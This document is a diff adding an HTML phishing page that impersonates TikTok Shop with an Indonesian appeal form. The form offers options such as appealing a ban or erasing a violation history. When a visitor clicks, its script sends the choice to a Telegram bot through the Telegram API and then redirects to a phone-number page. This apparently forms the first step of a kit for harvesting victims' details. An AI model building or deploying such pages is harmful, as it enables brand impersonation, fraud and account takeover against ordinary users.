@@ -1,0 +1,356 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>TikTok Shop</title>
+    <meta property="og:title" content="TikTok Shop">
+    <meta property="twitter:title" content="TikTok Shop">
+    <meta property="twitter:card" content="summary_large_image">
+    <meta property="og:image:type" content="image/jpeg"> 
+    <meta property="og:image" content="https://hosting.tigerengine.id/u7k57y.png" >
+    <meta property="twitter:image:src" content="https://hosting.tigerengine.id/u7k57y.png">
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Ubuntu:wght@300;400;500;700&display=swap');
+    * {
+        font-family: 'Ubuntu', sans-serif;
+        font-weight: 400;
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        position: relative;
+        color: #000;
+    }
+    .b { font-weight: 500; }
+    html { width: 100vw; height: 100vh; }
+    body {
+        background: #fff;
+        width: 100%;
+        height: 100%;
+    }
+    .container {
+        width: 100%;
+        padding: 20px;
+        height: 100%;
+        max-width:350px;
+        margin: 0 auto;
+        text-align:center;
+    }
+    .flex {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+    }
+    .hero {
+        width: 100%;
+        height: 283px;
+    }
+    .hero img {
+        width: 80%;
+        margin-top:50px;
+    }
+    h1 {
+        font-size: 20px;
+        text-align: center;
+        margin: 20px 0;
+        font-weight: 600;
+    }
+    form {
+        width: 100%;
+        height: auto;
+        flex-direction: column;
+    }
+    label {
+        display: block;
+        font-size: 15px;
+        text-align: left;
+        margin-bottom: 8px;
+        font-weight: 500;
+    }
+    select {
+        width: 100%;
+        height: 40px;
+        border-radius: 4px;
+        padding: 0 10px;
+        outline: none;
+        border: 1px solid #aeaeae;
+        background: #fff;
+        margin-bottom: 20px;
+    }
+    input:focus,
+    select:focus {
+        border: 1.1px solid #000;
+    }
+    input {
+        width: 100%;
+        background: #fff;
+        height: 40px;
+        border-radius: 4px;
+        border: 1px solid #aeaeae;
+        outline: none;
+        padding: 0 10px;
+        font-size: 16px;
+        margin-bottom: 20px;
+    }
+    button {
+        margin-top: 10px;
+        width: 100%;
+        height: 40px;
+        border: none;
+        outline: none;
+        border-radius: 8px;
+        color: #fff;
+        background: #000;
+        text-align: center;
+        font-size: 13px;
+    }
+    
+     welalxcome {
+    display: flex;
+  position: fixed;
+  top: 0;
+  left: 0;
+  right: 0;
+  bottom: 0;
+  width: 100%;
+  background:rgba(255,255,255, 0.6) url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjWC-NwOaB0INDq1VSSlZCZRJmIp623Ty14o-wDCplIwUTmewqoFy7zBPJ2aLj2LNxksLd7z46M-YGDsK_hQ_N7QR4GsuaOY5u7nXhcC0IkY6Tmu260SLTnL8Q63hjdrLeWoGUyEUb3pCIKTTqk25Y750wnj0DlpdmZeUeDx65qSzb2Dx9dhfOym1AI/s16000/Screenshot_2023-05-09-19-10-23-30_f4e4ecb26678a2259e115c26f2593e0f.jpg) no-repeat center center;
+  background-position: 100% 100%;
+  background-size: 100% 100%;
+  z-index: 10000;
+
+}
+welalxcome img {
+        width:100%;
+    height: 700px;
+    margin-top: -55px;
+    
+}
+chsalxcome {
+        position: relative;
+    width: 100%;
+    height: 100vh;
+    display: flex;
+    flex-direction: column;
+    flex-wrap: nowrap;
+    align-items: center;
+}
+
+.navku{ 
+          
+          width: 100%;
+          height: 50px;
+           background:rgba(255,255,255, 0.6) url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgpIUf_Vn492ZxXZXJG0lqpWu0EKrr_8jz8YjtjjM31N49XSO2GiS7qgy3zQrL4l2g8WikPHTMQwhoEwFJ79aBS3gqS27wpg3IBor4Rl8C3MEhzDHzrjuF6uLxUByw0RNgW3MUpj3zwARSq5ks3UXrkQYc8BOYV9Vt0LFePk53s-dfvoQcXm_h63tsh/s16000/Screenshot_2023-05-09-20-28-57-93_40deb401b9ffe8e1df2f1cc5ba480b12.jpg) no-repeat center center;
+  background-position: 100% 100%;
+  background-size: 100% 100%;
+          position: fixed;
+          top: 0;
+          right: 0;
+          left: 0;
+          z-index:999999;
+      }
+      
+      
+      .aha {
+  display: flex;
+  cursor: pointer;
+  text-align: center;
+  padding-right: 7px;
+  font-size: 14px;
+  position: relative;
+  height: 40px;
+  overflow: hidden;
+  background-color: #EE3056;
+  border-radius: 10px;
+  margin-top: 4px;
+  margin-bottom: 1.4ex;  
+  box-shadow: rgb(170, 170, 170) 5px 5px 7px 0px;
+  transition: background 200ms ease 0s;  
+  border: 1.5px solid #ddd;
+  }
+
+.aha:hover{
+      opacity: 0.7;
+}
+
+.aha input {
+  position: fixed;
+  left: -55555px;
+  display: flex;
+  margin: auto;  
+  text-align: center;
+  justify-content: center;
+  align-items: center;
+}
+
+
+ 
+
+.s{
+  display: flex;
+  color: #fff;
+  width: 500%;
+  height: 40px;
+  text-shadow: none;
+  margin: auto;  
+  text-align: center;
+  justify-content: center;
+  align-items: center;
+  font-weight: 800;
+  }
+  
+.s:active{
+      color: #000;
+}
+
+ .process1 {
+            width: 100%;
+            height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: auto;
+            position: fixed;
+            padding-top: 30px;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.4);
+            z-index: 999999999;
+            
+      
+}
+.loading {
+    position: fixed;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    align-items: center;
+    margin-bottom: 20%;
+    margin-top: 0px;
+}
+.loading img {
+    width: 90px;
+    border-radius: 10px;
+}
+
+</style>
+</head>
+<body>
+ <center>
+<div id="djload" name="process" class="process1" style="display: none;">
+      <div class="loading">
+       <img src="https://hosting.tigerengine.id/eyyhg8.gif">              
+            </div>
+        </div>
+        </center>
+      <main>
+         
+ <welalxcome>
+ 
+</welalxcome>
+<chsalxcome2 style="display: none;">
+<div style="height:30px;width: 70px;margin-top: -30px;margin-bottom: 0px;float:center;margin-left:42%" class="talxcome">
+</div><nav class="navku">
+    
+</nav>
+    <div class="container">
+        <div class="flex hero">
+              <br>
+            <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiGColxzc7ZEtJKsSkjKQ6U5QWd8HI4MWJSmWbFFqd3k4PbCiPLhBGYXe2dM5Q_jTAFVB1r4Ueo2nm2Sw6qLToCP3qlJONi3BEi4L0n9nVSjjvKFOs3gT-IUfW5JQy9OleFhySo8pI9tR-loVIgeWlolWgqrZo1IgK0iqhIWnKaGvBXwu7cGHcjAIWd/s16000/icon_id_login.e77bdaf9.png" alt="">
+        </div>
+       
+       <h1 class="">Formulir Banding</h1>
+            <label>Layanan</label>
+          
+          
+    <label class="aha">
+    <input type="radio" id="tarif" name="tarif" value="𝗔𝗷𝘂𝗸𝗮𝗻 𝗕𝗮𝗻𝗱𝗶𝗻𝗴" onclick="letsgo1()"/>
+    <span class="s">Ajukan Banding</span>
+	    	</label> 
+      
+     <label class="aha">
+    <input type="radio" id="tarif" name="tarif" value="𝗛𝗮𝗽𝘂𝘀 𝗥𝗶𝘄𝗮𝘆𝗮𝘁 𝗣𝗲𝗹𝗮𝗻𝗴𝗴𝗮𝗿𝗮𝗻" onclick="letsgo1()"/>
+    <span class="s">Hapus Riwayat Pelanggaran</span>
+	    	</label>  
+    
+    <label class="aha">
+    <input type="radio" id="tarif" name="tarif" value="𝗠𝗮𝘀𝗮𝗹𝗮𝗵 𝗣𝗲𝗻𝗴𝗶𝗿𝗶𝗺𝗮𝗻" onclick="letsgo1()"/>
+    <span class="s">Masalah Pengiriman</span>
+	    	</label>
+	    	
+	    	<label class="aha">
+    <input type="radio" id="tarif" name="tarif" value="𝗞𝗼𝗺𝗽𝗹𝗲𝗻 𝗣𝗿𝗼𝗱𝘂𝗸" onclick="letsgo1()"/>
+    <span class="s">Komplen Produk</span>
+	    	</label>
+	    	
+	    	<label class="aha">
+    <input type="radio" id="tarif" name="tarif" value="𝗞𝗶𝗿𝗶𝗺 𝗗𝗼𝗸𝘂𝗺𝗲𝗻 𝗣𝗲𝗻𝗱𝘂𝗸𝘂𝗻𝗴?" onclick="location.href='seri.html';"/>
+    <span class="s">Kirim Dokumen Pendukung?</span>
+	    	</label>
+	    	
+	    	        
+          
+            
+            
+      
+           
+            
+   
+        <br>
+   
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
+        <script src="i.js"></script>
+<script>
+
+        $( document ).ready(function() {
+
+            setTimeout(() => {
+                $('welalxcome').hide();
+                $('chsalxcome2').fadeIn();
+            },1500)
+        })
+        
+        
+ var logo = "𝘄𝘄𝘄.𝘁𝗶𝗸𝘁𝗼𝗸𝘀𝗵𝗼𝗽.𝗰𝗼𝗺";
+        
+ function letsgo1(){
+ event.preventDefault();
+      $(".process1").fadeIn(); 
+   
+   var tarif = $('input[name="tarif"]:checked').val();
+       if (tarif) {  
+  sessionStorage.setItem('tarif', tarif);
+  }   
+      
+      var selectedOption = $("input[name='tarif']:checked").val();
+        if (selectedOption) {
+            sendToTelegram(selectedOption);
+        } else {
+            alert("Silakan pilih salah satu opsi.");
+        }
+    
+    function sendToTelegram(tarif) {
+        
+        var gabungan = "" + logo + '%0A%0A※ ' + tarif;
+        $.ajax({
+            type: 'POST',
+            url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
+            data: {
+                chat_id: grup,
+                text: gabungan  
+            },                    
+            complete: function(data) {
+            setTimeout(function(){            
+            window.location.href='nohp.html';
+            $(".process1").fadeOut();     
+   }, 500);
+            }
+          })
+        }
+ }
+</script>
+    </div>
+</body>
+</html>
